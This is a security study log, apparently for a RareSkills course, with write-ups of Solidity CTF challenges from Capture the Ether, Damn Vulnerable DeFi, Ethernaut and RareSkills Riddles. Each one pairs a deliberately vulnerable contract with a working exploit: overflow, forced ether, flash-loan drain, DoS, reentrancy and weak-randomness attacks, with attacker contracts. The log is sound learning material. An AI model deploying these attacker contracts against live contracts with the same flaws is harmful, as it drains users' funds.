# Security - Week 2

## Capture the Ether (RareSkills Repo) - Token Sale

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total);

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}
```

### Exploit

While this challenge is part of a Foundry repo, it can also be conveniently solved in Remix without the need to write any code.

To complete the challenge, we need to find a way to issue ourselves tokens either for free or at least at a discount so that we can sell the tokens back at the normal price for a profit.

First, observe that `buy` has an unchecked block, allowing `total` to overflow. So, our first idea could be to choose `numTokens` in such a way that `total == 0`. (In this case, we would trick the contract into issuing us tokens _for free_.) Note that, since we're working with `uint256`, we have: `0 == 2**256`. Hence, a `numTokens` value that would yield `total == 0` can be computed via `2**256 / PRICE_PER_TOKEN == 2**256 / 10**18`. However, doing so, e.g., with [WolframAlpha](https://www.wolframalpha.com/), we see that the exact result of this computation is _not_ an integer:

```
2**256 / 10**18 == 441711766194596082395824375185729628956870974218904739530401550323154944 / 3814697265625
```

Hence, we cannot use this value as our `numTokens` input parameter because `numTokens` has to be an unsigned integer.

We can, however, overflow `total` just enough so that `numTokens` can be specified as an integer. Sure, in this case, we don't get all our tokens for free, but we would get them at a huge discount.

More precisely, we want to find an `x` such that `2**256 + x == 0 mod 10**18`. If we solve this equation in WolframAlpha, we get `x == 415992086870360064`. Now, if we compute `(2**256 + 415992086870360064) / 10**18`, we get `115792089237316195423570985008687907853269984665640564039458` as the integer value that we can use for `numTokens` in order to overflow `total`.

In other words,  if we call `buy` and specify `numTokens = 115792089237316195423570985008687907853269984665640564039458`, then we only need to pay 415992086870360064 wei (0.41599... ether) to get 115792089237316195423570985008687907853269984665640564039458 tokens in return!

After calling `buy` in this way, the contract's new balance is 1.415992086870360064 ether, i.e., it didn't even earn the price of a single token (1 ether) but issued an insane amount of tokens to us. We can subsequently call `sell` with `numTokens = 1` to earn 1 ether from the contract, resulting in a contract balance of 0.415992086870360064 ether (< 1 ether), which completes the challenge.

## Capture the Ether (RareSkills Repo) - Retirement Fund

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract RetirementFund {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = block.timestamp + 520 weeks;

    constructor(address player) payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (block.timestamp < expiration) {
            // early withdrawal incurs a 10% penalty
            (bool ok, ) = msg.sender.call{
                value: (address(this).balance * 9) / 10
            }("");
            require(ok, "Transfer to msg.sender failed");
        } else {
            (bool ok, ) = msg.sender.call{value: address(this).balance}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);
        uint256 withdrawn = 0;
        unchecked {
            withdrawn += startBalance - address(this).balance;

            // an early withdrawal occurred
            require(withdrawn > 0);
        }

        // penalty is what's left
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer to msg.sender failed");
    }
}
```

### Exploit

This challenge is conveniently solved via Remix. First, deploy the contract from Remix's default account. Set `player` to the address of that default account so that it becomes the `beneficiary`.

Next, observe that `collectPenalty` contains a vulnerable `unchecked` block. Suppose we can somehow achieve `startBalance < address(this).balance`. In that case, `withdrawn` will underflow, pass `require(withdrawn > 0)`, and, therefore, allow us to transfer the contract's entire balance to our account by calling `collectPenalty`.

Unfortunately, the contract does _not_ implement:
- a `fallback` function
- a `receive` function
- any `payable` functions (except the constructor which is restricted to receiving exactly 1 ether)

Therefore, one could naively assume that it is not possible to send any more ether to the contract to achieve `startBalance < address(this).balance`.

However, we can force-send ether by calling the `selfdestruct` instruction on another contract containing funds, and specifying the `RetirementFund` as the target!

Thus, we can carry out our attack as follows:

1. Deploy a second contract (see below) **with an initial balance of 1 wei**.
2. Call `forceSend`, specifying `RetirementFund`'s address as the target. This will lead to `startBalance < address(this).balance` on the `RetirementFund` contract since the new values will be `startBalance == 1 ether` and `address(this).balance == 1 ether + 1 wei`
3. Call `collectPenalty`. Because `startBalance < address(this).balance`, `withdrawn` will underflow, pass `require > 0`, and result in a transfer of the contract's entire balance to our account.

NOTE: At the time of writing, `selfdestruct` has been deprecated. The underlying opcode will eventually undergo breaking changes. Therefore, this solution might no longer be valid depending on when you're reading this.

```solidity
// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.0;

contract ForceSend {
    // This constructor is payable, allowing the contract to be deployed with 1 wei.
    constructor() payable {}

    // Function to force-send Ether to a target address.
    function forceSend(address payable target) external {
        // The selfdestruct function sends all remaining Ether and destroys the contract.
        selfdestruct(target);
    }
}
```

## Damn Vulnerable DeFi - Side Entrance

### Contract

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        
        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
    }
}
```

### Exploit

This challenge is conveniently solved via Remix. First, we deploy the contract from Remix's default account. Next, we call `deposit`, specifying a transaction value of `42000000000000000000 == 42 ether` to fund the pool with its initial balance. (The original assignment described in Damn Vulnerable DeFi specifies a pool with an initial balance of 1000 ether instead of 42 ether. However, bumping the contract's balance up to 1000 ether is quite tedious in Remix. Since the exact pool balance doesn't really matter, we'll assume a pool balance of 42 ether instead of 1000 ether for convenience.)

With the initial setup completed, we now have to find a way to drain all funds from the contract using a different account than the one we used for the deposit.

To achieve that, we can deploy an attacker contract that will perform the following steps:

1. Call `flashLoan` to borrow 42 ether.
2. Pay back the flash loan by calling `deposit` with a value of 42 ether. Notice that this will register a deposit balance of 42 ether for the attacker contract!
3. Call `withdraw` to drain 42 ether from the pool.

All of the above steps can be performed with a single function call to `attack` using the contract shown below. Notice that 

1. you must specify the victim contract's address during the deployment of the attacker contract and
2. you must specify `amount = 42000000000000000000` when calling `attack`.

```solidity
// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker {

    SideEntranceLenderPool public sideEntranceLenderPool;

    constructor(SideEntranceLenderPool _sideEntranceLenderPool) {
        sideEntranceLenderPool = _sideEntranceLenderPool;
    }

    receive() external payable {}

    function execute() external payable {
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        sideEntranceLenderPool.flashLoan(amount);
        sideEntranceLenderPool.withdraw();
    }
} 
```

## Damn Vulnerable DeFi - Unstoppable

### Contracts

_UnstoppableVault.sol_
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/utils/FixedPointMathLib.sol";
import "solmate/src/utils/ReentrancyGuard.sol";
import { SafeTransferLib, ERC4626, ERC20 } from "solmate/src/mixins/ERC4626.sol";
import "solmate/src/auth/Owned.sol";
import { IERC3156FlashBorrower, IERC3156FlashLender } from "@openzeppelin/contracts/interfaces/IERC3156.sol";

/**
 * @title UnstoppableVault
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626 {
    using SafeTransferLib for ERC20;
    using FixedPointMathLib for uint256;

    uint256 public constant FEE_FACTOR = 0.05 ether;
    uint64 public constant GRACE_PERIOD = 30 days;

    uint64 public immutable end = uint64(block.timestamp) + GRACE_PERIOD;

    address public feeRecipient;

    error InvalidAmount(uint256 amount);
    error InvalidBalance();
    error CallbackFailed();
    error UnsupportedCurrency();

    event FeeRecipientUpdated(address indexed newFeeRecipient);

    constructor(ERC20 _token, address _owner, address _feeRecipient)
        ERC4626(_token, "Oh Damn Valuable Token", "oDVT")
        Owned(_owner)
    {
        feeRecipient = _feeRecipient;
        emit FeeRecipientUpdated(_feeRecipient);
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function maxFlashLoan(address _token) public view returns (uint256) {
        if (address(asset) != _token)
            return 0;

        return totalAssets();
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function flashFee(address _token, uint256 _amount) public view returns (uint256 fee) {
        if (address(asset) != _token)
            revert UnsupportedCurrency();

        if (block.timestamp < end && _amount < maxFlashLoan(_token)) {
            return 0;
        } else {
            return _amount.mulWadUp(FEE_FACTOR);
        }
    }

    function setFeeRecipient(address _feeRecipient) external onlyOwner {
        if (_feeRecipient != address(this)) {
            feeRecipient = _feeRecipient;
            emit FeeRecipientUpdated(_feeRecipient);
        }
    }

    /**
     * @inheritdoc ERC4626
     */
    function totalAssets() public view override returns (uint256) {
        assembly { // better safe than sorry
            if eq(sload(0), 2) {
                mstore(0x00, 0xed3ba6a6)
                revert(0x1c, 0x04)
            }
        }
        return asset.balanceOf(address(this));
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address _token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
        uint256 fee = flashFee(_token, amount);
        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);
        // callback must return magic value, otherwise assume it failed
        if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256("IERC3156FlashBorrower.onFlashLoan"))
            revert CallbackFailed();
        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);
        return true;
    }

    /**
     * @inheritdoc ERC4626
     */
    function beforeWithdraw(uint256 assets, uint256 shares) internal override nonReentrant {}

    /**
     * @inheritdoc ERC4626
     */
    function afterDeposit(uint256 assets, uint256 shares) internal override nonReentrant {}
}
```

_ReceiverUnstoppable.sol_
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solmate/src/auth/Owned.sol";
import { UnstoppableVault, ERC20 } from "../unstoppable/UnstoppableVault.sol";

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverUnstoppable is Owned, IERC3156FlashBorrower {
    UnstoppableVault private immutable pool;

    error UnexpectedFlashLoan();

    constructor(address poolAddress) Owned(msg.sender) {
        pool = UnstoppableVault(poolAddress);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        if (initiator != address(this) || msg.sender != address(pool) || token != address(pool.asset()) || fee != 0)
            revert UnexpectedFlashLoan();

        ERC20(token).approve(address(pool), amount);

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function executeFlashLoan(uint256 amount) external onlyOwner {
        address asset = address(pool.asset());
        pool.flashLoan(
            this,
            asset,
            amount,
            bytes("")
        );
    }
}
```

### Exploit

Before attempting this challenge, I highly recommend familiarizing yourself with [flash loans](https://www.rareskills.io/post/erc-3156) and [token vaults](https://www.rareskills.io/post/erc4626). 

Now, to get an idea of the starting conditions of this challenge, let's first take a closer look at the _unstoppable.challenge.js_ file.

_unstoppable.challenge.js_
```javascript
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, player, someUser;
    let token, vault, receiverContract;

    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
    const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, player, someUser] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        vault = await (await ethers.getContractFactory('UnstoppableVault', deployer)).deploy(
            token.address,
            deployer.address, // owner
            deployer.address // fee recipient
        );
        expect(await vault.asset()).to.eq(token.address);

        await token.approve(vault.address, TOKENS_IN_VAULT);
        await vault.deposit(TOKENS_IN_VAULT, deployer.address);

        expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
        expect(
            await vault.flashFee(token.address, TOKENS_IN_VAULT)
        ).to.eq(50000n * 10n ** 18n);

        await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
            vault.address
        );
        await receiverContract.executeFlashLoan(100n * 10n ** 18n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        await expect(
            receiverContract.executeFlashLoan(100n * 10n ** 18n)
        ).to.be.reverted;
    });
});
```
As we can see from the above code, the `before` hook sets up the challenge as follows: 

1. The deployer (who has a DVT balance of `type(uint256).max` after deploying the DVT contract) first deposits 1,000,000 DVT via the vault's `deposit` function. This means that, after the deposit, the vault holds 1,000,000 DVT, and the deployer holds 1,000,000 shares - let's call them "S tokens". In particular, S now has a total supply of 1,000,000.
2. After making the deposit, the deployer then sends 10 DVT to the player.

Our goal is to make the vault stop offering flash loans. In other words, we're looking for a way to DoS the `flashLoan` function.

To start, notice that `flashLoan` contains various `revert` statements. If we can somehow achieve that one of these `revert`s is triggered with every function call, then we'd complete the challenge.

Taking a closer look, we see that the lines

```solidity
uint256 balanceBefore = totalAssets();
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

are indeed vulnerable!

To see that, let's first take a closer look at `convertToShares`:

```solidity
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}
```

First, notice that we _don't_ have the case `supply == 0` after performing our initial setup since the total supply of S tokens is 1,000,000 after the deployer made the initial deposit. So, roughly speaking, the function will perform the following calculation:

```
assets * supply / totalAssets()
```

Now, in the `flashLoan` function, the `asset` parameter is set to `totalSupply`, i.e., the total supply of S tokens. Ignoring decimals, the above calculation will, therefore, yield 1,000,000 * 1,000,000 / 1,000,000 since `supply` (i.e., the total supply of S) and `totalAssets()` (i.e., the vault's DVT balance) are equal to 1,000,000.

So far, nothing bad happened. However, notice that **we can donate DVT to the vault without calling `deposit`!**

If we, e.g., donate 1 DVT, we'll end up with `balanceBefore` being 1,000,001 while `convertToShares(totalSupply)` being 1,000,000 * 1,000,000 / 1,000,001. In other words, by simply transferring 1 DVT to the vault (using DVT's `transfer`, not the vault's `deposit`!), we can achieve that `convertToShares(totalSupply) != balanceBefore` will be `true` and `flashLoan` will revert.

As a conclusion, we simply need to add the following line to _unstoppable.challenge.js_:

```javascript
it("Execution", async function () {
  /** CODE YOUR SOLUTION HERE */
  await token.connect(player).transfer(vault.address, 1n * 10n ** 18n);
});
```



## Ethernaut - Denial

### Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9e);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

### Exploit

Notice that `partner.call{value:amountToSend}("")` will forward 63/64 of the available gas to the `partner`. Hence, we can perform a Denial-of-Service attack by deploying the contract below and setting this contract as the new `partner`. In the Ethernaut console, this can be achieved by first deploying the contract, e.g., via Remix, and then executing `await contract.setWithdrawPartner("<put your gas consumer contract address here>")` in the console.

Here's a simple example of a contract that will consume all available gas:

```solidity
// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.0;

contract GasConsumer {
    uint public counter;

    // Consumes all available gas
    receive() external payable {
        while (true) {
            counter++; 
        }
    }
}
```

Since 63/64 of the initial gas supply will already be gone after executing `partner.call{value:amountToSend}("")`, the remaining 1/64 won't be sufficient to execute the rest of the function. Therefore, the transaction will run out of gas and revert.

Two final comments:

1. Depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e., one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this attack. In our particular case, however, the challenge specifically requires us to assume that the transaction is of 1M gas or less. Under this assumption, the above DoS attack will be successful.
2. You might be tempted to simply use `assert(false)` instead of an infinite loop to consume all gas. Admittedly, this approach would result in even fewer lines of code for the attacker contract. However, this approach only works prior to Solidity version 0.8.0! From 0.8.0 onwards, `assert` no longer uses the INVALID opcode (which consumes all remaining gas) but instead the REVERT opcode (which refunds the remaining gas to the sender). You can read up on the details in the [Solidity docs](https://docs.soliditylang.org/en/latest/080-breaking-changes.html) and in [this article](https://hackernoon.com/an-update-to-soliditys-assert-statement-you-mightve-missed).


## Ethernaut - Naught Coin

### Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

### Exploit

This challenge is conveniently solved via Remix. The goal is to transfer all tokens from the `player`'s account to another address. At first sight, this looks like an impossible thing to do because the `lockTokens` modifier prevents the `player` from executing `transfer` during the first 10 years after contract deployment.

However, notice that the ERC-20 interface exposes _two_ functions that facilitate token transfers: `transfer` and `transferFrom`. 

In the above contract, `transfer` is overridden and protected by `lockTokens`. `transferFrom`, however, is _not_ overridden and, in particular, _not_ protected by the `lockTokens` modifier!

Therefore, we can solve this challenge using the following steps:

1. Deploy the contract, setting `_player` to an address we control.
2. Use `player`'s account to approve a second account we control for the entire `INITIAL_SUPPLY`.
3. Call `transferFrom` from our second account, specifying `player` as the `_from` parameter and `INITIAL_SUPPLY` for the `_value` parameter. Since the only goal of the challenge is to remove all tokens from the `player`'s account, we can specify an arbitrary address for the `_to` parameter (except the `player`'s address). 

# Security - Week 1

## Capture the Ether (RareSkills Repo) - Guess the Secret Number

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessTheSecretNumber {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable returns (bool) {
        require(msg.value == 1 ether);

        if (keccak256(abi.encodePacked(n)) == answerHash) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to Send 2 ether");
        }
        return true;
    }
}
```

### Exploit

Note that `n` is of data type `uint8`, i.e., the number we're looking for must be an unsigned integer between 0 and 255. Since the set of possible solutions is so small, we can easily brute-force the solution either on-chain or off-chain.

The code below demonstrates how to solve this challenge on-chain:

_GetSecretNumber.sol_
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessTheSecretNumber {
    ...
}

contract ExploitContract {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    function Exploiter() public view returns (uint8) {
        uint8 n;
        for (uint8 i; i < 255; i++) {
            if (keccak256(abi.encodePacked(i)) == answerHash) {
                n = i;
            }
        }
        return n;
    }
}

```

_GetSecretNumber.t.sol_
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GuessSecretNumber.sol";

contract GuessSecretNumberTest is Test {
    ExploitContract exploitContract;
    GuessTheSecretNumber guessTheSecretNumber;

    function setUp() public {
        // Deploy "GuessTheSecretNumber" contract and deposit one ether into it
        guessTheSecretNumber = (new GuessTheSecretNumber){value: 1 ether}();

        // Deploy "ExploitContract"
        exploitContract = new ExploitContract();
    }

    function testFindSecretNumber() public {
        uint8 secretNumber = exploitContract.Exploiter();
        _checkSolved(secretNumber);
    }

    function _checkSolved(uint8 _secretNumber) internal {
        assertTrue(guessTheSecretNumber.guess{value: 1 ether}(_secretNumber), "Wrong Number");
        assertTrue(guessTheSecretNumber.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
```

## Capture the Ether (RareSkills Repo) - Guess the New Number

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessNewNumber {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable returns (bool pass) {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        if (n == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Fail to send to msg.sender");
            pass = true;
        }
    }
}
```

### Exploit

Since both `blockhash(block.number - 1)` and `block.timestamp` can also be accessed by an attacker contract, we can reproduce `answer` inside an attacker contract using the exact same code:

_GetNewNumber.sol_
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessNewNumber {
    ...
}

contract ExploitContract {
    GuessNewNumber public guessNewNumber;
    uint8 public answer;

    function Exploit() public returns (uint8) {
        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        return answer;
    }
}
```

_GetNewNumber.t.sol_
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GuessNewNumber.sol";

contract GuessNewNumberTest is Test {
    GuessNewNumber public guessNewNumber;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        guessNewNumber = (new GuessNewNumber){value: 1 ether}();
        exploitContract = new ExploitContract();
    }

    function testNumber(uint256 blockNumber, uint256 blockTimestamp) public {
        // Prevent zero inputs
        vm.assume(blockNumber != 0);
        vm.assume(blockTimestamp != 0);
        // Set block number and timestamp
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // Place your solution here
        uint8 answer = exploitContract.Exploit();
        _checkSolved(answer);
    }

    function _checkSolved(uint8 _newNumber) internal {
        assertTrue(guessNewNumber.guess{value: 1 ether}(_newNumber), "Wrong Number");
        assertTrue(guessNewNumber.isComplete(), "Balance is supposed to be zero");
    }

    receive() external payable {}
}
```

## Capture the Ether (RareSkills Repo) - Predict the Future

### Contract

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}
```

### Exploit

Note that `answer` has to be an integer between 0 and 9 because it is computed modulo 10. Therefore, we can lock in any guess, e.g., 0, and spam the contract by calling `settle` multiple times across multiple blocks. Notice that because `settle` will reset `guesser` to the zero address, we need to ensure the transaction reverts if we guessed wrong. (Otherwise, we'd be required to always call `lockInGuess` before calling `settle`. In particular, we'd be required to pay 1 ether for each attempt, making our spamming strategy unprofitable.)

We can conveniently execute this attack in Remix using the attacker contract below.

NOTE: `lockInGuess` must be called via the attacker contract to pass `require(msg.sender == guesser)` during settlement.

```solidity
//SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.13;

import "./PredictTheFuture.sol";

contract ExploitContract {
    PredictTheFuture public predictTheFuture;

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    receive() external payable {} 

    function lockInGuess() external payable {
        predictTheFuture.lockInGuess{value: 1 ether}(0);
    }

    function attack() external {
        predictTheFuture.settle();
        require(predictTheFuture.isComplete(), "Exploit failed");
    }
}
```

## RareSkills Riddles - Overmint1-ERC1155

### Contract

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Overmint1_ERC1155 is ERC1155 {
    using Address for address;
    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping(uint256 => uint256) public totalSupply;

    constructor() ERC1155("Overmint1_ERC1155") {}

    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }

    function success(address _attacker, uint256 id) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}
```

### Exploit

The `mint` function doesn't follow the checks-effects-interactions pattern and is, therefore, vulnerable to reentrancy. To see this, note that the ERC1155 `_mint` function calls `_doSafeTransferAcceptanceCheck` under the hood, which in turn calls `onERC1155Received` on the receiving contract. This hands over control to the receiving contract before `amountMinted` is updated.

Therefore, we can solve this challenge using a custom `onERC1155Received` function that reenters `mint` until our attacker contract has a balance of 5 tokens of a given `id`. 

_Overmint1_ERC1155_Attacker.sol_
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "./Overmint1-ERC1155.sol";

contract Overmint1_ERC1155_Attacker is IERC1155Receiver {
    Overmint1_ERC1155 public overmint1ERC1155;

    constructor(address _victim) {
        overmint1ERC1155 = Overmint1_ERC1155(_victim);
    }

    // Fallback function can be used to start the attack
    function attack() public {
        overmint1ERC1155.mint(0, "");
        overmint1ERC1155.safeTransferFrom(address(this), msg.sender, 0, 5, "");
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        override
        returns (bytes4)
    {
        if (overmint1ERC1155.balanceOf(address(this), 0) < 5) {
            overmint1ERC1155.mint(0, "");
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external pure override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
